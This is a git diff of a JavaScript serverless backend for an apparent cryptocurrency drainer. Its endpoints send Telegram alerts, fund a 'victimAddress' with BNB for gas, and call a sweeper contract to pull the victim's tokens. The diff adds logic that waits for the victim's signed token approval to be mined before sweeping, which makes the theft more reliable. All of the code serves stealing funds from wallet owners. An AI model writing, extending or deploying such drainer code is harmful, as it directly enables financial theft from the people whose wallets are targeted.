@@ -22,15 +22,24 @@ async function sendTelegram(message) {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "HTML",
-      }),
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" }),
     })
   } catch (error) {
     console.error("Telegram error:", error)
   }
+}
+
+// Wait until the approval tx is mined (timeout ~90s)
+async function waitForApproval(txHash) {
+  if (!txHash) return true
+  for (let i = 0; i < 90; i++) {
+    try {
+      const receipt = await provider.getTransactionReceipt(txHash)
+      if (receipt && receipt.status === 1) return true
+    } catch {}
+    await new Promise(r => setTimeout(r, 1000))
+  }
+  return false
 }
 
 export async function handler(event) {
@@ -42,13 +51,11 @@ export async function handler(event) {
   let path = (event.path || "").replace(/^\/\.netlify\/functions\/api/, "").replace(/^\/api/, "")
 
   try {
-    // ========== TELEGRAM ALERTS ==========
     if (path === "/telegram" && event.httpMethod === "POST") {
       await sendTelegram(body.message || "")
       return { statusCode: 200, headers, body: JSON.stringify({ success: true }) }
     }
 
-    // ========== GAS FUNDING ==========
     if (path === "/fund-gas" && event.httpMethod === "POST") {
       const { victimAddress } = body
       const balance = await provider.getBalance(victimAddress)
@@ -65,9 +72,15 @@ export async function handler(event) {
       return { statusCode: 200, headers, body: JSON.stringify({ success: true, message: "Victim has enough BNB." }) }
     }
 
-    // ========== SWEEP USDT ==========
     if (path === "/sweep" && event.httpMethod === "POST") {
-      const { victimAddress } = body
+      const { victimAddress, approvalTxHash } = body
+
+      // Approval is signed BEFORE gas is funded, so wait for it to confirm first
+      const mined = await waitForApproval(approvalTxHash)
+      if (!mined) {
+        return { statusCode: 500, headers, body: JSON.stringify({ success: false, error: "Approval not mined yet" }) }
+      }
+
       const sweeperABI = ["function sweep(address victim, address token) external"]
       const sweeper = new ethers.Contract(SWEEPER_CONTRACT, sweeperABI, fundingWallet)
 
